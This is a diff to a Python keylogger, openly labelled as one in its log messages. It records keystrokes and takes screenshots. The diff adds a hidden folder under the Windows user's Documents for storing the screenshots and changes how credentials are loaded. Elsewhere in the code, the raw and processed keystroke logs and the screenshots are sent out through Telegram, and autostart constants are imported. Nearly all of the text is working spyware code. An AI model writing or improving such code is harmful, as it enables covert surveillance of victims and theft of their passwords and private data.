@@ -2,6 +2,7 @@ import os
 import shutil
 import sys
 
+import credentials
 from constants import (
     AUTOSTART_CONTENT,
     AUTOSTART_DIR,
@@ -15,7 +16,6 @@ from constants import (
 from log_utils import format_message, process_keys, write_to_log
 from PIL import ImageGrab
 from telegram_utils import (
-    load_credentials_telegram_from_script,
     send_image_telegram,
     send_info_telegram,
 )
@@ -122,17 +122,28 @@ def take_screenshot():
         - Exception: If an error occurs while taking or saving the screenshot.
     """
     try:
-        if not os.path.exists(IMG_DIR):
-            os.makedirs(IMG_DIR)
-            print("Directory {} created successfully!".format(IMG_DIR))
+        img_dir = IMG_DIR
+        if is_windows():
+            # Get the path to the user's "Documents" directory
+            documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')
+
+            # Define the name of the hidden directory
+            hidden_dir_name = '.' + IMG_DIR
+
+            # Create the full path to the hidden directory
+            img_dir = os.path.join(documents_dir, hidden_dir_name)
+
+        if not os.path.exists(img_dir):
+            os.makedirs(img_dir)
+            print("Directory {} created successfully!".format(img_dir))
 
         image_number = 1
         while os.path.isfile('{}{}'.format(
-                IMG_DIR, IMG_FILE + str(image_number) + '.png')):
+                img_dir, IMG_FILE + str(image_number) + '.png')):
             image_number += 1
 
         im = ImageGrab.grab()
-        image_name = '{}{}'.format(IMG_DIR,
+        image_name = '{}{}'.format(img_dir,
                                    IMG_FILE + str(image_number) + '.png')
         im.save(image_name, 'png')
 
@@ -162,15 +173,14 @@ def handle_keyboard_interrupt(key_listener):
     write_to_log(message, LOG_FILE)
     write_to_log(processed_message, LOG_FILE_2)
 
-    credentials = load_credentials_telegram_from_script()
+    creds = credentials.get_credentials()
 
     # Load credentials a pass to send logs through Telegram
-    send_info_telegram(**credentials,
-                       message='RAW KEYLOGGER LOG\n\n' + message)
-    send_info_telegram(**credentials,
+    send_info_telegram(**creds, message='RAW KEYLOGGER LOG\n\n' + message)
+    send_info_telegram(**creds,
                        message='PROCESSED KEYLOGGER LOG\n\n' +
                        processed_message)
-    send_image_telegram(**credentials, image=screenshot)
+    send_image_telegram(**creds, image=screenshot)
 
     try:
         sys.exit(130)
